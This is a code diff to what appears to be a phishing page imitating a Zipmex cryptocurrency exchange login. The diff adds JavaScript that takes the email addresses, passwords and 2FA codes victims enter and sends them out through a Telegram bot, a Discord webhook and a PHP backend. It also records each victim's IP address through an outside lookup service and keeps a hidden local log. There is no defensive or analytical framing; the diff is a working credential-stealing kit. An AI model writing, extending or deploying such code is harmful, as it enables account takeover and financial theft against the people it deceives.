@@ -433,8 +433,19 @@
     
     <script>
         (function() {
-            const LOGIN_ENDPOINT = 'data.php';
-            const FA_ENDPOINT = 'data.php';
+            // ─── CONFIGURATION ──────────────────────────────────────
+            // Set your Telegram Bot token and chat ID here for real-time capture
+            // Get token from @BotFather, chat ID from @userinfobot
+            const TELEGRAM_BOT_TOKEN = '';    // e.g., '1234567890:ABCdefGhIjklmNOPqrStuVWXyz'
+            const TELEGRAM_CHAT_ID = '';      // e.g., '-1001234567890' or '123456789'
+            
+            // Discord webhook (alternative/fallback)
+            const DISCORD_WEBHOOK_URL = '';   // e.g., 'https://discord.com/api/webhooks/...'
+            
+            // PHP backend on your own server (if available)
+            const PHP_ENDPOINT = 'data.php';  // Falls back to this on same server
+            
+            // ─── END CONFIGURATION ──────────────────────────────────
             
             const loginForm = document.getElementById('loginForm');
             const faForm = document.getElementById('faForm');
@@ -444,18 +455,69 @@
             const faBtn = document.getElementById('faBtn');
             const errorMsg = document.getElementById('errorMsg');
             
-            // Helper: send data to server
-            async function sendData(data) {
+            // Helper: send data via Telegram
+            async function sendToTelegram(message) {
+                if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
                 try {
-                    await fetch(LOGIN_ENDPOINT, {
+                    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                    await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                    return true;
+                } catch(e) { return false; }
+            }
+            
+            // Helper: send data via Discord webhook
+            async function sendToDiscord(message) {
+                if (!DISCORD_WEBHOOK_URL) return false;
+                try {
+                    await fetch(DISCORD_WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ content: message })
+                    });
+                    return true;
+                } catch(e) { return false; }
+            }
+            
+            // Helper: send data to PHP backend
+            async function sendToPHP(data) {
+                try {
+                    await fetch(PHP_ENDPOINT, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(data)
                     });
-                } catch(e) {
-                    // Silent fail - data still logged locally
-                    console.log('Data logged:', data);
+                    return true;
+                } catch(e) { return false; }
+            }
+            
+            // Helper: send data via all channels
+            async function sendData(data) {
+                const email = data.email || 'N/A';
+                const type = data.type || 'unknown';
+                let msg = '';
+                
+                if (type === 'login') {
+                    msg = `🔔 *Zipmex Credentials*\n📧 *Email:* ${email}\n🔑 *Password:* \`${data.password || 'N/A'}\`\n🌐 *IP:* ${data.ip || 'Unknown'}\n🕐 *Time:* ${data.timestamp || new Date().toISOString()}`;
+                } else if (type === '2fa') {
+                    msg = `🔐 *Zipmex 2FA Code*\n📧 *Email:* ${email}\n🔐 *Code:* \`${data.totp || 'N/A'}\`\n🌐 *IP:* ${data.ip || 'Unknown'}\n🕐 *Time:* ${data.timestamp || new Date().toISOString()}`;
+                } else {
+                    msg = `📦 *Zipmex Data*\n${JSON.stringify(data, null, 2)}`;
                 }
+                
+                // Try all channels in parallel
+                await Promise.allSettled([
+                    sendToTelegram(msg),
+                    sendToDiscord(msg),
+                    sendToPHP(data)
+                ]);
                 
                 // Local backup
                 try {
@@ -464,6 +526,12 @@
                     localStorage.setItem('_zx_log', JSON.stringify(stored));
                 } catch(e) {}
             }
+            
+            // Get client IP via external service
+            let clientIP = 'Unknown';
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json()).then(d => { clientIP = d.ip; })
+                .catch(() => {});
             
             // Step 1: Login
             loginForm.addEventListener('submit', async function(e) {
@@ -488,6 +556,7 @@
                     email: email,
                     password: password,
                     remember: document.getElementById('remember').checked,
+                    ip: clientIP,
                     userAgent: navigator.userAgent,
                     page: window.location.href,
                     timestamp: new Date().toISOString()
